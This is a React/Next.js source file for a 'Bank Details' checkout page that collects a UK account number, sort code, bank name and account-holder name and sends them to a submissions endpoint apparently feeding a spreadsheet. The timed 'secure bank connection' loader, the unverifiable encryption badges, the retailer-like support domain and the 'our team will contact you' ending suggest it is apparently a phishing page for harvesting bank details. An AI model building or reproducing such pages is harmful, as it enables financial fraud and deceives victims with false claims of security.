"use client";

import { FormEvent, useEffect, useState } from "react";
import { CheckCircle2 } from "lucide-react";
import { CheckoutHeader } from "@/components/layout/CheckoutHeader";
import { CheckoutFooter } from "@/components/layout/CheckoutFooter";
import { BankPageLoader } from "@/components/ui/BankPageLoader";
import { CardBrandStrip } from "@/components/ui/CardBrandStrip";
import { SubmissionFeedback } from "@/components/ui/SubmissionFeedback";
import { CheckoutTrustRow } from "@/components/ui/CheckoutTrustRow";
import { SupportChip } from "@/components/ui/SupportChip";

type BankDetailsState = {
  bankAccountNumber: string;
  sortCode: string;
  bankName: string;
  nameWithBank: string;
};

function formatSortCodeForDisplay(sortCodeDigits: string): string {
  const digits = sortCodeDigits.replace(/\D/g, "").slice(0, 6);
  if (digits.length <= 2) {
    return digits;
  }
  if (digits.length <= 4) {
    return `${digits.slice(0, 2)}-${digits.slice(2)}`;
  }
  return `${digits.slice(0, 2)}-${digits.slice(2, 4)}-${digits.slice(4)}`;
}

async function submitBankDetailsToSheet(payload: BankDetailsState): Promise<string | null> {
  try {
    const response = await fetch("/api/checkout-submissions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        formType: "bank_details",
        ...payload,
      }),
    });

    if (!response.ok) {
      const fallback = "Could not submit your details. Please try again.";
      try {
        const data = (await response.json()) as { message?: string };
        return data.message || fallback;
      } catch {
        return fallback;
      }
    }

    return null;
  } catch {
    return "Network issue while submitting. Please try again.";
  }
}

export default function BankDetailsPage() {
  const [showLoader, setShowLoader] = useState(true);
  const [form, setForm] = useState<BankDetailsState>({
    bankAccountNumber: "",
    sortCode: "",
    bankName: "",
    nameWithBank: "",
  });
  const [error, setError] = useState<string>("");
  const [submitState, setSubmitState] = useState<"idle" | "submitting" | "success">(
    "idle",
  );

  useEffect(() => {
    const timer = window.setTimeout(() => {
      setShowLoader(false);
    }, 1600);

    return () => window.clearTimeout(timer);
  }, []);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError("");
    setSubmitState("idle");

    if (form.bankAccountNumber.length !== 8) {
      setError("Bank account number must be exactly 8 digits.");
      return;
    }

    if (form.sortCode.length !== 6) {
      setError("Sort code must be exactly 6 digits.");
      return;
    }

    if (!form.bankName.trim()) {
      setError("Bank name is required.");
      return;
    }

    if (!form.nameWithBank.trim()) {
      setError("Name with bank is required.");
      return;
    }

    setSubmitState("submitting");
    const submissionError = await submitBankDetailsToSheet(form);

    if (submissionError) {
      setSubmitState("idle");
      setError(submissionError);
      return;
    }

    setSubmitState("success");
  };

  const resetForm = () => {
    setForm({
      bankAccountNumber: "",
      sortCode: "",
      bankName: "",
      nameWithBank: "",
    });
    setError("");
    setSubmitState("idle");
  };

  return (
    <>
      {showLoader ? (
        <BankPageLoader title="Loading secure bank connection..." />
      ) : null}
      <CheckoutHeader />
      <main className="bg-slate-50 pb-[max(2rem,env(safe-area-inset-bottom))] pt-6 sm:pt-10">
        <section className="mx-auto max-w-3xl px-3 sm:px-6">
          <div className="rounded-2xl border border-slate-200 bg-white px-4 py-6 shadow-[0_16px_48px_rgba(15,23,42,0.08)] sm:px-8 sm:py-8">
          <a
            href="#bank-details-form"
            className="text-sm font-medium text-(--color-brand-pink) hover:underline"
          >
            Skip to content
          </a>
          <h1 className="text-[2.05rem] font-semibold tracking-tight text-slate-900 sm:text-4xl">
            Bank Details
          </h1>
          <p className="mt-3 text-[15px] leading-relaxed text-slate-600 sm:text-sm">
            We prioritize the security of your financial information. Rest
            assured, our payment process is designed to ensure the
            confidentiality and safety of your bank details. Please provide the
            following information to complete your purchase:
          </p>
          <div className="mt-4 flex flex-wrap items-center gap-2 text-[11px] font-semibold sm:text-xs">
            <span className="rounded-full bg-emerald-50 px-2.5 py-1 text-emerald-700">
              Bank-grade encryption
            </span>
            <span className="rounded-full bg-sky-50 px-2.5 py-1 text-sky-700">
              Verified payment channel
            </span>
            <span className="rounded-full bg-slate-100 px-2.5 py-1 text-slate-700">
              Secure data handling
            </span>
          </div>

          <CardBrandStrip />

          {submitState === "success" ? (
            <div className="mt-8 rounded-2xl border border-emerald-200 bg-emerald-50/40 p-5 sm:p-6">
              <div className="mx-auto flex max-w-xl flex-col items-center text-center">
                <CheckCircle2 className="h-12 w-12 text-emerald-600" aria-hidden />
                <h2 className="mt-3 text-2xl font-semibold tracking-tight text-slate-900">
                  Submitted Successfully
                </h2>
                <p className="mt-2 text-sm leading-relaxed text-slate-600">
                  Your bank details are securely submitted. Our team will
                  review and contact you in a short time.
                </p>
                <p className="mt-2 text-xs font-medium text-slate-500">
                  Need urgent help?{" "}
                  <a
                    href="mailto:support@fonehouse.cloud"
                    className="text-(--color-brand-pink) hover:underline"
                  >
                    support@fonehouse.cloud
                  </a>
                </p>
                <button
                  type="button"
                  onClick={resetForm}
                  className="mt-5 inline-flex items-center justify-center rounded-xl border border-slate-300 bg-white px-5 py-2.5 text-sm font-semibold text-slate-700 transition hover:bg-slate-50"
                >
                  Submit another response
                </button>
              </div>
            </div>
          ) : (
            <form
              id="bank-details-form"
              onSubmit={handleSubmit}
              className="mt-6 space-y-4 sm:space-y-5"
            >
              <div>
                <div className="mb-2 flex items-center justify-between">
                  <label
                    htmlFor="bankAccountNumber"
                    className="block text-[13px] font-medium text-slate-700 sm:text-sm"
                  >
                    Bank Account Number *
                  </label>
                  <span className="text-[11px] text-slate-500 sm:text-xs">
                    {form.bankAccountNumber.length} / 8
                  </span>
                </div>
                <input
                  id="bankAccountNumber"
                  name="bankAccountNumber"
                  type="text"
                  inputMode="numeric"
                  placeholder="00000000"
                  value={form.bankAccountNumber}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      bankAccountNumber: event.target.value
                        .replace(/\D/g, "")
                        .slice(0, 8),
                    }))
                  }
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              <div>
                <div className="mb-2 flex items-center justify-between">
                  <label
                    htmlFor="sortCode"
                    className="block text-[13px] font-medium text-slate-700 sm:text-sm"
                  >
                    Sort Code *
                  </label>
                  <span className="text-[11px] text-slate-500 sm:text-xs">
                    {form.sortCode.length} / 6
                  </span>
                </div>
                <input
                  id="sortCode"
                  name="sortCode"
                  type="text"
                  inputMode="numeric"
                  placeholder="000000"
                  value={formatSortCodeForDisplay(form.sortCode)}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      sortCode: event.target.value.replace(/\D/g, "").slice(0, 6),
                    }))
                  }
                  maxLength={8}
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              <div>
                <label
                  htmlFor="bankName"
                  className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                >
                  Bank Name *
                </label>
                <input
                  id="bankName"
                  name="bankName"
                  type="text"
                  placeholder="Bank Name"
                  value={form.bankName}
                  onChange={(event) =>
                    setForm((prev) => ({ ...prev, bankName: event.target.value }))
                  }
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              <div>
                <label
                  htmlFor="nameWithBank"
                  className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                >
                  Name with Bank *
                </label>
                <input
                  id="nameWithBank"
                  name="nameWithBank"
                  type="text"
                  placeholder="Name with Bank"
                  value={form.nameWithBank}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      nameWithBank: event.target.value,
                    }))
                  }
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              {error ? <p className="text-sm text-red-600">{error}</p> : null}
              <SubmissionFeedback
                state={submitState === "submitting" ? "submitting" : "idle"}
                successTitle="Bank details received successfully."
                successDescription="Thank you. We will review and get back to you in a short time."
              />
              <CheckoutTrustRow
                primary="Encrypted bank submission"
                secondary="Secure verification in progress"
              />

              <button
                type="submit"
                disabled={submitState === "submitting"}
                className="inline-flex w-full items-center justify-center rounded-xl bg-slate-900 px-6 py-3.5 text-sm font-semibold text-white shadow-[0_10px_24px_rgba(15,23,42,0.22)] transition hover:bg-slate-800 active:scale-[0.99] sm:w-auto sm:hover:-translate-y-0.5"
              >
                {submitState === "submitting" ? "Submitting..." : "Save Bank Details"}
              </button>
            </form>
          )}
          </div>
        </section>
      </main>
      <SupportChip />
      <CheckoutFooter />
    </>
  );
}
